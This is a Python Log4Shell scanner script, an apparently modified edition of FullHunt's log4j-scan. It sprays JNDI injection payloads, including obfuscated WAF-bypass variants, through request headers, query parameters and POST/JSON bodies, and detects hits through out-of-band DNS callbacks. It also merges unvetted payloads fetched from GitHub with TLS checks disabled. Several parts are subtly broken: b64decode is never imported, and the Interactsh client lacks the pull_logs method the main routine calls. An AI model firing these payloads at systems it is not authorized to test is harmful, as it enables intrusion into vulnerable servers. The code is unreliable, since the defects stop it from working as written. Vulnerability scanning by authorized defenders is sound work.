#!/usr/bin/env python3
# coding=utf-8
# ******************************************************************
# log4j-scan (updated edition)
# A generic scanner for Apache Log4Shell (CVE-2021-44228), its patch
# bypasses (CVE-2021-45046 / CVE-2021-45105 / CVE-2021-44827) and
# related lookup-injection RCEs (e.g. Text4Shell CVE-2022-42889).
#
# Built on top of FullHunt's original log4j-scan design, extended with
# a user-initiated, live CVE update engine (NVD-first, GitHub fallback):
#     python3 log4j-scan-updated.py --update-cves
#
# Author of the original scanner:
#     Mazin Ahmed <Mazin at FullHunt.io>
#     Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
# ******************************************************************

import argparse
import json
import os
import random
import re
import sys
import time
from datetime import datetime, timedelta, timezone
from urllib import parse as urlparse
from uuid import uuid4
from base64 import b64encode

import requests

try:
    from termcolor import cprint
except ImportError:  # pragma: no cover - termcolor is in requirements.txt
    def cprint(text, *args, **kwargs):
        print(text)


# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass


SCANNER_NAME = "log4j-scan"
SCANNER_VERSION = "2.0.0"

cprint(f"[•] {SCANNER_NAME} v{SCANNER_VERSION} - Apache Log4Shell & related CVEs scanner", "green")
cprint("[•] Based on the original FullHunt.io log4j-scan design.", "yellow")
cprint("[•] Supports user-initiated live CVE updates: --update-cves", "yellow")

if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)


default_headers = {
    f'{SCANNER_NAME}-Signature': f'{SCANNER_NAME}/{SCANNER_VERSION}',
    'User-Agent': f'{SCANNER_NAME}/{SCANNER_VERSION} (https://github.com/fullhunt/log4j-scan)',
    # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
}

post_data_parameters = ["username", "user", "uname", "name", "email", "email_address", "password"]
timeout = 4

# ------------------------------------------------------------------
# CVE knowledge base handling
# ------------------------------------------------------------------
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
BUNDLED_DB_PATH = os.path.join(SCRIPT_DIR, "cvedb", "cve_database.json")
USER_DB_PATH = os.environ.get("LOG4J_SCAN_CVE_DB", os.path.join(SCRIPT_DIR, "cve_database.updated.json"))

# Last-resort fallback payloads if no database file can be loaded at all.
FALLBACK_CVES = {
    "CVE-2021-44228": {
        "title": "Apache Log4j2 Remote Code Execution (Log4Shell)",
        "severity": "CRITICAL",
        "cvss_v3": 10.0,
        "oob_required": True,
        "default": True,
        "payloads": [
            "${jndi:ldap://{{callback_host}}/{{random}}}",
            "${jndi:dns://{{callback_host}}/{{random}}}",
        ],
        "waf_bypass_payloads": [
            "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
            "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
            "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}}",
        ],
    }
}


def load_cve_db(db_path=None):
    """Loads the most recent CVE database available.

    Priority: explicit --cve-db path > user-updated DB (newer last_updated) > bundled DB.
    """
    candidates = []
    if db_path:
        candidates.append(("explicit", db_path))
    else:
        candidates.append(("bundled", BUNDLED_DB_PATH))
        candidates.append(("updated", USER_DB_PATH))

    loaded = {}
    for source, path in candidates:
        try:
            with open(path, "r") as f:
                data = json.load(f)
            if isinstance(data, dict) and isinstance(data.get("cves"), dict) and data["cves"]:
                loaded[source] = (data, path)
        except FileNotFoundError:
            continue
        except Exception as e:
            cprint(f"[!] Failed to parse CVE database '{path}': {e}", "red")

    if not loaded:
        cprint("[!] No CVE database found - falling back to built-in minimal payloads.", "red")
        return {"metadata": {"version": "fallback", "last_updated": "", "source": "built-in"},
                "cves": dict(FALLBACK_CVES), "_db_path": "built-in fallback"}

    def ts(entry):
        try:
            return datetime.fromisoformat(str(entry[0].get("metadata", {}).get("last_updated", ""))[:19])
        except Exception:
            return datetime.min

    if db_path:  # explicit path wins unconditionally
        best = list(loaded.values())[0]
    elif "updated" in loaded and "bundled" in loaded:
        best = max(loaded["bundled"], loaded["updated"], key=ts)
    elif "updated" in loaded:
        best = loaded["updated"]
    else:
        best = loaded["bundled"]

    data, path = best
    data["_db_path"] = path
    return data


CVE_DB = load_cve_db()
CVE_LIST = sorted(CVE_DB["cves"].keys(), key=lambda c: (len(c), c))


def get_selected_cves(args):
    """Resolves which CVEs from the database should be tested."""
    cves = CVE_DB["cves"]
    if args.test_all_cves:
        selected = sorted(cves.keys())
    elif args.test_cve:
        requested = [c.strip().upper() for c in args.test_cve.split(",") if c.strip()]
        unknown = [c for c in requested if c not in cves]
        if unknown:
            cprint(f"[!] Unknown CVE(s) in database: {', '.join(unknown)} "
                    f"(run --update-cves or check --list-cves)", "red")
        selected = [c for c in requested if c in cves]
        if not selected:
            sys.exit("[!] No valid CVE selected. Exiting.")
    else:
        selected = [c for c, meta in cves.items() if meta.get("default", False)]
        if not selected:  # safety net: never select nothing
            selected = ["CVE-2021-44228"] if "CVE-2021-44228" in cves else sorted(cves.keys())[:1]
    return selected


def build_payload_list(selected_cves, callback_host, random_string, waf_bypass=False):
    """Builds the full payload list for one URL from the selected CVE entries."""
    payloads = []
    for cve in selected_cves:
        entry = CVE_DB["cves"][cve]
        template_sets = [entry.get("payloads", [])]
        if waf_bypass:
            template_sets.append(entry.get("waf_bypass_payloads", []))
        for templates in template_sets:
            for template in templates:
                p = template.replace("{{callback_host}}", callback_host).replace("{{random}}", random_string)
                payloads.append((cve, p))
    return payloads


# ------------------------------------------------------------------
# Live CVE update engine (user-initiated via --update-cves)
# ------------------------------------------------------------------
NVD_API_URL = "https://services.nvd.nist.gov/rest/json/cves/2.0"
GITHUB_RAW_BASE = "https://raw.githubusercontent.com/"

# Curated community payload sources used as the detection-payload layer of the
# update. Each repo ships plain-text files with one payload template per line;
# 'CALLBACK_DOMAIN' placeholders are normalised into our templating format.
PAYLOAD_FEEDS = [
    # (repo, ref, files)
    ("trickest/log4j", "main", ["payloads/manual.txt", "payloads/new-line.txt", "payloads/null-bytes.txt"]),
    ("fullhunt/log4j-scan", "master", ["headers.txt"]),  # fuzzing headers reference
]

# Known Log4j-related CVEs whose curated payloads ship inside the bundled DB.
KNOWN_LOG4J_CVES = [
    "CVE-2021-44228", "CVE-2021-45046", "CVE-2021-45105", "CVE-2021-44827",
    "CVE-2022-42889",
]

JNDI_RE = re.compile(r"\$\{[^{}]*jndi[^{}]*\}", re.IGNORECASE)
LOOKUP_RE = re.compile(r"\$\{\s*(?::{0,2})?(?:jndi|url|dns|script|ctx|env|sys|date|java|lower|upper)\s*[:|]",
                       re.IGNORECASE)


def nvd_get(params, api_key=None):
    headers = {"User-Agent": f"{SCANNER_NAME}/{SCANNER_VERSION}"}
    if api_key:
        headers["apiKey"] = api_key
    resp = requests.get(NVD_API_URL, params=params, headers=headers,
                        verify=False, timeout=30, proxies=PROXIES)
    if resp.status_code == 404:
        # NVD rejects some parameter combinations (e.g. keywordSearch + pubStartDate
        # ranges) with a bare 404. Retry once without the date window.
        retried = {k: v for k, v in params.items() if k not in ("pubStartDate", "pubEndDate")}
        if retried != params:
            resp = requests.get(NVD_API_URL, params=retried, headers=headers,
                                verify=False, timeout=30, proxies=PROXIES)
    if resp.status_code == 429:
        raise RuntimeError("NVD API rate limit hit (HTTP 429). Retry later or set NVD_API_KEY.")
    resp.raise_for_status()
    return resp.json()


def fetch_nvd_metadata(cve_id, api_key=None):
    """Fetches title/severity/CVSS for a single CVE from NVD."""
    data = nvd_get({"cveId": cve_id}, api_key=api_key)
    vulnerabilities = data.get("vulnerabilities", [])
    if not vulnerabilities:
        return None
    cve = vulnerabilities[0]["cve"]
    description = ""
    for d in cve.get("descriptions", []):
        if d.get("lang") == "en":
            description = d.get("value", "")
            break
    severity, cvss = "UNKNOWN", None
    metrics = cve.get("metrics", {})
    for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
        for m in metrics.get(key, []):
            cvss_data = m.get("cvssData", {})
            severity = (cvss_data.get("baseSeverity") or m.get("baseSeverity") or severity).upper()
            cvss = cvss_data.get("baseScore", cvss)
            break
        if cvss is not None:
            break
    return {"title": (description[:200] or cve_id), "severity": severity, "cvss_v3": cvss}


def search_nvd_new_cves(api_key=None, days_back=400):
    """Searches NVD for recent Log4j/Log4Shell related CVEs."""
    since = datetime.now(timezone.utc) - timedelta(days=days_back)
    results = {}
    for keyword in ("log4j", "log4shell"):
        try:
            data = nvd_get({"keywordSearch": keyword,
                            "resultsPerPage": 200,
                            "pubStartDate": since.strftime("%Y-%m-%dT%H:%M:%S.000"),
                            "pubEndDate": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000")},
                           api_key=api_key)
        except Exception as e:
            cprint(f"[!] NVD keyword search failed for '{keyword}': {e}", "red")
            continue
        for item in data.get("vulnerabilities", []):
            cve = item["cve"]
            cve_id = cve["id"]
            desc = ""
            for d in cve.get("descriptions", []):
                if d.get("lang") == "en":
                    desc = d.get("value", "")
                    break
            text = desc.lower()
            relevant = any(k in text for k in ("log4j", "log4shell", "jndi injection"))
            severity, cvss = "UNKNOWN", None
            metrics = cve.get("metrics", {})
            for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
                for m in metrics.get(key, []):
                    cd = m.get("cvssData", {})
                    severity = (cd.get("baseSeverity") or severity).upper()
                    cvss = cd.get("baseScore", cvss)
                    break
                if cvss is not None:
                    break
            if relevant:
                results[cve_id] = {"title": desc[:200], "severity": severity, "cvss_v3": cvss}
    return results


def fetch_github_payloads(proxies):
    """Pulls JNDI/lookup payload templates from curated community feeds."""
    payloads = []
    for repo, ref, files in PAYLOAD_FEEDS:
        for fname in files:
            url = f"{GITHUB_RAW_BASE}{repo}/{ref}/{fname}"
            try:
                resp = requests.get(url, timeout=20, proxies=proxies, verify=False,
                                    headers={"User-Agent": f"{SCANNER_NAME}/{SCANNER_VERSION}"})
                if resp.status_code != 200:
                    continue
                for line in resp.text.splitlines():
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    # Normalise community placeholders into our templating format.
                    line = re.sub(r"(?i)callback_?domain", "{{callback_host}}", line)
                    if LOOKUP_RE.search(line):
                        # Ensure a per-scan unique path component when missing.
                        if "{{callback_host}}" in line and "{{random}}" not in line:
                            line = re.sub(r"({{callback_host}})(?![^/])", r"\1/{{random}}", line, count=1) \
                                if "/{{random}}" not in line and not line.endswith("}}") else line
                        payloads.append(line)
            except Exception:
                continue
    # De-duplicate while preserving order.
    seen, unique = set(), []
    for p in payloads:
        if p not in seen:
            seen.add(p)
            unique.append(p)
    return unique


def update_cve_database(args):
    """User-initiated CVE update.

    1. Queries NVD for the latest Log4j-related CVE metadata (titles, severities, CVSS).
    2. Refreshes known CVE metadata from NVD as well.
    3. Pulls fresh detection payloads from curated community feeds (GitHub).
    4. Merges everything into an updated database written next to the tool
       (or --cve-db-out). Existing curated payloads are preserved; newly
       discovered payloads are attached to the Log4Shell entry so future scans
       automatically use them.
    """
    api_key = args.nvd_api_key or os.environ.get("NVD_API_KEY", "")
    out_path = args.cve_db_out or USER_DB_PATH

    cprint("[•] CVE update initiated by user. Querying NVD for the latest Log4j-related CVEs...", "cyan")
    db = {"metadata": {}, "cves": {}}
    # Start from the currently active DB so curated payloads/metadata survive updates.
    try:
        with open(BUNDLED_DB_PATH, "r") as f:
            db = json.load(f)
    except Exception:
        db = {"metadata": {}, "cves": dict(FALLBACK_CVES)}
    db.setdefault("cves", {})
    db.setdefault("metadata", {})

    new_meta = {}
    try:
        new_meta = search_nvd_new_cves(api_key=api_key)
        cprint(f"[•] NVD returned {len(new_meta)} Log4j-related CVE record(s).", "cyan")
    except Exception as e:
        cprint(f"[!] NVD search failed: {e}", "red")

    added, refreshed = [], []
    for cve_id, meta in sorted(new_meta.items()):
        if cve_id in db["cves"]:
            db["cves"][cve_id].update({k: v for k, v in meta.items() if v})
            refreshed.append(cve_id)
        else:
            db["cves"][cve_id] = {
                "title": meta.get("title", cve_id),
                "severity": meta.get("severity", "UNKNOWN"),
                "cvss_v3": meta.get("cvss_v3"),
                "affected": "see NVD record",
                "fixed_in": "see NVD record",
                "oob_required": True,
                "default": False,  # new CVEs must be opted into explicitly
                "payloads": [],
                "waf_bypass_payloads": [],
                "reference": f"https://nvd.nist.gov/vuln/detail/{cve_id}",
            }
            added.append(cve_id)

    # Refresh known CVE metadata individually (covers rate-limit-tolerant small calls).
    for cve_id in KNOWN_LOG4J_CVES:
        if cve_id in db["cves"] and cve_id not in new_meta:
            try:
                meta = fetch_nvd_metadata(cve_id, api_key=api_key)
                if meta:
                    db["cves"][cve_id].update({k: v for k, v in meta.items() if v})
                time.sleep(0.8 if not api_key else 0.2)  # NVD rate limiting courtesy
            except Exception:
                pass  # offline/partial update is still useful

    cprint("[•] Fetching fresh detection payloads from curated community feeds...", "cyan")
    fresh_payloads = fetch_github_payloads(PROXIES)
    jndi_payloads = [p for p in fresh_payloads if JNDI_RE.search(p)]
    other_payloads = [p for p in fresh_payloads if p not in jndi_payloads]

    merged = 0
    anchor = db["cves"].get("CVE-2021-44228")
    if anchor is not None:
        existing = set(anchor.get("payloads", [])) | set(anchor.get("waf_bypass_payloads", []))
        for p in jndi_payloads + other_payloads:
            if p not in existing:
                anchor.setdefault("waf_bypass_payloads", []).append(p)
                existing.add(p)
                merged += 1
    # Attach generic payloads to brand-new CVEs that shipped without any.
    for cve_id in added:
        if not db["cves"][cve_id].get("payloads"):
            db["cves"][cve_id]["payloads"] = ["${jndi:ldap://{{callback_host}}/{{random}}}"]

    db["metadata"]["last_updated"] = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    db["metadata"]["version"] = datetime.now(timezone.utc).strftime("%Y.%m.%d")
    db["metadata"]["updater"] = f"{SCANNER_NAME}/{SCANNER_VERSION}"

    try:
        os.makedirs(os.path.dirname(out_path) or ".", exist_ok=True)
        with open(out_path, "w") as f:
            json.dump(db, f, indent=2)
    except Exception as e:
        sys.exit(f"[!] Failed to write updated CVE database to '{out_path}': {e}")

    cprint("", "white")
    cprint(f"[✓] CVE database updated -> {out_path}", "green")
    cprint(f"    • Total CVEs tracked : {len(db['cves'])}", "green")
    if added:
        cprint(f"    • New CVEs added     : {', '.join(added)}", "yellow")
    if refreshed:
        cprint(f"    • Metadata refreshed   : {', '.join(refreshed)}", "cyan")
    cprint(f"    • Payloads merged      : {merged} new detection payload(s)", "cyan")
    if not added and not new_meta:
        cprint("    • No new CVE records found online - bundled knowledge base remains current.", "cyan")
    cprint("[•] Scans now use the updated database automatically (verify with --list-cves).", "green")


# ------------------------------------------------------------------
# CLI
# ------------------------------------------------------------------
parser = argparse.ArgumentParser(
    description=f"{SCANNER_NAME} v{SCANNER_VERSION}: Apache Log4Shell & related-CVE scanner "
                f"with user-initiated live CVE updates.")
parser.add_argument("-u", "--url", dest="url", help="Check a single URL.", action='store')
parser.add_argument("-p", "--proxy", dest="proxy", help="send requests through proxy", action='store')
parser.add_argument("-l", "--list", dest="usedlist", help="Check a list of URLs.", action='store')
parser.add_argument("--request-type", dest="request_type",
                    help="Request Type: (get, post) - [Default: get].", default="get", action='store')
parser.add_argument("--headers-file", dest="headers_file",
                    help="Headers fuzzing list - [default: headers.txt].", default="headers.txt", action='store')
parser.add_argument("--run-all-tests", dest="run_all_tests",
                    help="Run all available tests on each URL.", action='store_true')
parser.add_argument("--exclude-user-agent-fuzzing", dest="exclude_user_agent_fuzzing",
                    help="Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.",
                    action='store_true')
parser.add_argument("--wait-time", dest="wait_time",
                    help="Wait time after all URLs are processed (in seconds) - [Default: 5].",
                    default=5, type=int, action='store')
parser.add_argument("--waf-bypass", dest="waf_bypass_payloads",
                    help="Extend scans with WAF bypass payloads.", action='store_true')
parser.add_argument("--custom-waf-bypass-payload", dest="custom_waf_bypass_payload",
                    help="Test with custom WAF bypass payload.")
parser.add_argument("--test-CVE-2021-45046", dest="cve_2021_45046",
                    help="Compat alias: test using payloads for CVE-2021-45046 (Log4j v2.15.0 patch bypass).",
                    action='store_true')
parser.add_argument("--test-CVE-2022-42889", dest="cve_2022_42889",
                    help="Compat alias: test using payloads for Apache Commons Text RCE (CVE-2022-42889).",
                    action='store_true')
parser.add_argument("--test-cve", dest="test_cve",
                    help="Comma-separated list of CVE IDs to test, e.g. "
                         "'CVE-2021-44228,CVE-2021-45046'. Overrides defaults.", action='store')
parser.add_argument("--test-all-cves", dest="test_all_cves",
                    help="Test every CVE present in the (possibly updated) database.", action='store_true')
parser.add_argument("--list-cves", dest="list_cves",
                    help="List all CVEs currently available in the knowledge base and exit.",
                    action='store_true')
parser.add_argument("--update-cves", dest="update_cves",
                    help="User-initiated update: pull the latest Log4j-related CVEs from NVD and fresh "
                         "detection payloads from curated community feeds, then merge them into the local "
                         "knowledge base (scans will use them automatically afterwards).",
                    action='store_true')
parser.add_argument("--nvd-api-key", dest="nvd_api_key",
                    help="Optional NVD API key (or set NVD_API_KEY env var) to speed up --update-cves.",
                    action='store')
parser.add_argument("--cve-db", dest="cve_db",
                    help="Path to an alternative CVE database JSON file.", action='store')
parser.add_argument("--cve-db-out", dest="cve_db_out",
                    help="Output path for --update-cves "
                         "[default: cve_database.updated.json next to this script].", action='store')
parser.add_argument("--dns-callback-provider", dest="dns_callback_provider",
                    help="DNS Callback provider (Options: dnslog.cn, interact.sh) - [Default: interact.sh].",
                    default="interact.sh", action='store')
parser.add_argument("--custom-dns-callback-host", dest="custom_dns_callback_host",
                    help="Custom DNS Callback Host.", action='store')
parser.add_argument("--disable-http-redirects", dest="disable_redirects",
                    help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have a higher chance of reaching vulnerable systems.",
                    action='store_true')

args = parser.parse_args()


PROXIES = {}
if args.proxy:
    PROXIES = {"http": args.proxy, "https": args.proxy}

# Re-load the DB if the user pointed us at an explicit file.
if args.cve_db:
    CVE_DB = load_cve_db(args.cve_db)

if args.list_cves:
    meta = CVE_DB.get("metadata", {})
    cprint(f"[•] CVE knowledge base: {meta.get('version', '?')} "
           f"(last updated: {meta.get('last_updated', 'unknown')})", "cyan")
    cprint(f"[•] Source file: {CVE_DB.get('_db_path', 'built-in fallback')}", "cyan")
    for cve_id in sorted(CVE_DB["cves"].keys()):
        entry = CVE_DB["cves"][cve_id]
        npay = len(entry.get("payloads", [])) + len(entry.get("waf_bypass_payloads", []))
        flag = " [ON BY DEFAULT]" if entry.get("default") else ""
        cprint(f"  • {cve_id:<16} [{entry.get('severity', '?'):<8}] "
               f"CVSS {str(entry.get('cvss_v3', '?')):<4} {npay:>3} payload(s){flag} - {entry.get('title', '')}",
               "magenta")
    cprint("[•] Run '--update-cves' to refresh this knowledge base from NVD + community feeds.", "yellow")
    sys.exit(0)

if args.update_cves:
    update_cve_database(args)
    if not (args.url or args.usedlist):
        sys.exit(0)
    # If a scan was requested together with the update, pick up the freshly written DB.
    CVE_DB = load_cve_db(args.cve_db)

if args.custom_waf_bypass_payload:
    CVE_DB["cves"].setdefault("CVE-2021-44228", {}).setdefault("waf_bypass_payloads", []) \
        .append(args.custom_waf_bypass_payload)

# Backwards-compatible flags from the original tool.
extra_selected = []
if args.cve_2021_45046:
    extra_selected.append("CVE-2021-45046")
if args.cve_2022_42889:
    extra_selected.append("CVE-2022-42889")


def get_fuzzing_headers(payload):
    fuzzing_headers = {}
    fuzzing_headers.update(default_headers)
    headers_file = args.headers_file
    if not os.path.exists(headers_file):
        alt = os.path.join(SCRIPT_DIR, headers_file)
        if os.path.exists(alt):
            headers_file = alt
    try:
        with open(headers_file, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue
                fuzzing_headers.update({i: payload})
    except FileNotFoundError:
        cprint(f"[!] Headers file '{args.headers_file}' not found; fuzzing only default headers.", "red")
    if args.exclude_user_agent_fuzzing:
        fuzzing_headers["User-Agent"] = default_headers["User-Agent"]

    if "Referer" in fuzzing_headers:
        fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
    return fuzzing_headers


def get_fuzzing_post_data(payload):
    fuzzing_post_data = {}
    for i in post_data_parameters:
        fuzzing_post_data.update({i: payload})
    return fuzzing_post_data


class Dnslog(object):
    def __init__(self):
        self.s = requests.session()
        req = self.s.get("http://www.dnslog.cn/getdomain.php",
                         proxies=PROXIES,
                         timeout=30)
        self.domain = req.text

    def pull_logs(self):
        req = self.s.get("http://www.dnslog.cn/getrecords.php",
                         proxies=PROXIES,
                         timeout=30)
        return req.json()


class Interactsh:
    # Source: https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/interactsh/__init__.py
    SERVERS = ["interact.sh", "ping.tr.interactsh.com", "oast.fun", "oast.pro", "oast.me", "oast.site", "oast.live"]

    def __init__(self, token="", server=""):
        from Crypto.Cipher import AES, PKCS1_OAEP
        from Crypto.PublicKey import RSA
        from Crypto.Hash import SHA256
        self._AES, self._PKCS1_OAEP, self._RSA, self._SHA256 = AES, PKCS1_OAEP, RSA, SHA256

        rsa = RSA.generate(2048)
        self.public_key = rsa.publickey().exportKey()
        self.private_key = rsa.exportKey()
        self.token = token
        self.server = (server or "").lstrip('.') or 'interact.sh'
        self.headers = {
            "Content-Type": "application/json",
        }
        if self.token:
            self.headers['Authorization'] = self.token
        self.secret = str(uuid4())
        self.encoded = b64encode(self.public_key).decode("utf8")
        guid = uuid4().hex.ljust(33, 'a')
        guid = ''.join(i if i.isdigit() else chr(ord(i) + random.randint(0, 20)) for i in guid)
        self.domain = f'{guid}.{self.server}'
        self.correlation_id = self.domain[:20]

        self.session = requests.session()
        self.session.headers = self.headers
        self.session.verify = False
        self.session.proxies = PROXIES
        self.register()

    def register(self):
        data = {
            "public-key": self.encoded,
            "secret-key": self.secret,
            "correlation-id": self.correlation_id
        }
        errors = []
        servers = [self.server] + [s for s in self.SERVERS if s != self.server]
        for srv in servers:
            self.server = srv
            self.domain = f'{self.domain.rsplit(".", 1)[0]}.{srv}'
            self.correlation_id = self.domain[:20]
            data["correlation-id"] = self.correlation_id
            try:
                res = self.session.post(f"https://{srv}/register", headers=self.headers, json=data, timeout=30)
                if 'success' in res.text:
                    return
                errors.append(f"{srv}: HTTP {res.status_code}")
            except Exception as e:
                errors.append(f"{srv}: {e.__class__.__name__}")
        raise Exception("Can not initiate interact.sh DNS callback client (%s)" % "; ".join(errors))

    def poll_logs(self):
        result = []
        url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret}"
        res = self.session.get(url, headers=self.headers, timeout=30).json()
        aes_key, data_list = res['aes_key'], res['data']
        for i in data_list:
            decrypt_data = self.__decrypt_data(aes_key, i)
            result.append(self.__parse_log(decrypt_data))
        return result

    def __decrypt_data(self, aes_key, data):
        private_key = self._RSA.importKey(self.private_key)
        cipher = self._PKCS1_OAEP.new(private_key, hashAlgo=self._SHA256)
        aes_plain_key = cipher.decrypt(b64decode(aes_key))
        decode = b64decode(data)
        bs = self._AES.block_size
        iv = decode[:bs]
        cryptor = self._AES.new(key=aes_plain_key, mode=self._AES.MODE_CFB, IV=iv, segment_size=128)
        plain_text = cryptor.decrypt(decode)
        return json.loads(plain_text[16:])

    def __parse_log(self, log_entry):
        new_log_entry = {"timestamp": log_entry["timestamp"],
                         "host": f'{log_entry["full-id"]}.{self.server}',
                         "remote_address": log_entry["remote-address"]
                         }
        return new_log_entry


def parse_url(url):
    """
    Parses the URL.
    """

    # Url: https://example.com/login.jsp
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')

    if ('://' not in url):
        url = str("http://") + str(url)
    scheme = urlparse.urlparse(url).scheme

    # FilePath: /login.jsp
    file_path = urlparse.urlparse(url).path
    if (file_path == ''):
        file_path = '/'

    return({"scheme": scheme,
            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
            "host": urlparse.urlparse(url).netloc.split(":")[0],
            "file_path": file_path})


def scan_url(url, callback_host, selected_cves):
    parsed_url = parse_url(url)
    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
    payloads = build_payload_list(selected_cves,
                                  f'{parsed_url["host"]}.{callback_host}',
                                  random_string,
                                  waf_bypass=args.waf_bypass_payloads)

    for cve, payload in payloads:
        cprint(f"[•] URL: {url} | CVE: {cve} | PAYLOAD: {payload}", "cyan")

        if args.request_type.upper() == "GET" or args.run_all_tests:
            try:
                requests.request(url=url,
                                 method="GET",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(payload),
                                 verify=False,
                                 timeout=timeout,
                                 allow_redirects=(not args.disable_redirects),
                                 proxies=PROXIES)
            except Exception as e:
                cprint(f"EXCEPTION: {e}")

        if args.request_type.upper() == "POST" or args.run_all_tests:
            try:
                # Post body
                requests.request(url=url,
                                 method="POST",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(payload),
                                 data=get_fuzzing_post_data(payload),
                                 verify=False,
                                 timeout=timeout,
                                 allow_redirects=(not args.disable_redirects),
                                 proxies=PROXIES)
            except Exception as e:
                cprint(f"EXCEPTION: {e}")

            try:
                # JSON body
                requests.request(url=url,
                                 method="POST",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(payload),
                                 json=get_fuzzing_post_data(payload),
                                 verify=False,
                                 timeout=timeout,
                                 allow_redirects=(not args.disable_redirects),
                                 proxies=PROXIES)
            except Exception as e:
                cprint(f"EXCEPTION: {e}")


def main():
    urls = []
    if args.url:
        urls.append(args.url)
    if args.usedlist:
        with open(args.usedlist, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue
                urls.append(i)

    if not urls:
        parser.print_usage()
        sys.exit("[!] No target specified. Use -u/--url or -l/--list (or --update-cves / --list-cves only).")

    selected_cves = get_selected_cves(args)
    for c in extra_selected:
        if c in CVE_DB["cves"] and c not in selected_cves:
            selected_cves.append(c)

    db_meta = CVE_DB.get("metadata", {})
    cprint(f"[•] Using CVE knowledge base v{db_meta.get('version', '?')} "
           f"(last updated: {db_meta.get('last_updated', 'unknown')}).", "magenta")
    cprint(f"[•] Selected CVEs for this scan: {', '.join(selected_cves)}", "magenta")
    if args.waf_bypass_payloads:
        cprint("[•] WAF-bypass payload sets enabled.", "magenta")

    dns_callback_host = ""
    dns_callback = None
    if args.custom_dns_callback_host:
        cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
        dns_callback_host = args.custom_dns_callback_host
    else:
        cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
        if args.dns_callback_provider == "interact.sh":
            dns_callback = Interactsh(server=os.environ.get("INTERACTSH_SERVER", ""))
        elif args.dns_callback_provider == "dnslog.cn":
            dns_callback = Dnslog()
        else:
            raise ValueError("Invalid DNS Callback provider")
        dns_callback_host = dns_callback.domain

    cprint("[•] Checking for Log4Shell (CVE-2021-44228) and selected related CVEs.", "magenta")
    for url in urls:
        cprint(f"[•] URL: {url}", "magenta")
        scan_url(url, dns_callback_host, selected_cves)

    if args.custom_dns_callback_host:
        cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
        return

    cprint("[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
    cprint("[•] Waiting...", "cyan")
    time.sleep(int(args.wait_time))
    records = dns_callback.pull_logs()
    if len(records) == 0:
        cprint("[•] Targets do not seem to be vulnerable.", "green")
    else:
        cprint("[!!!] Targets Affected", "yellow")
        for i in records:
            cprint(json.dumps(i), "yellow")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)
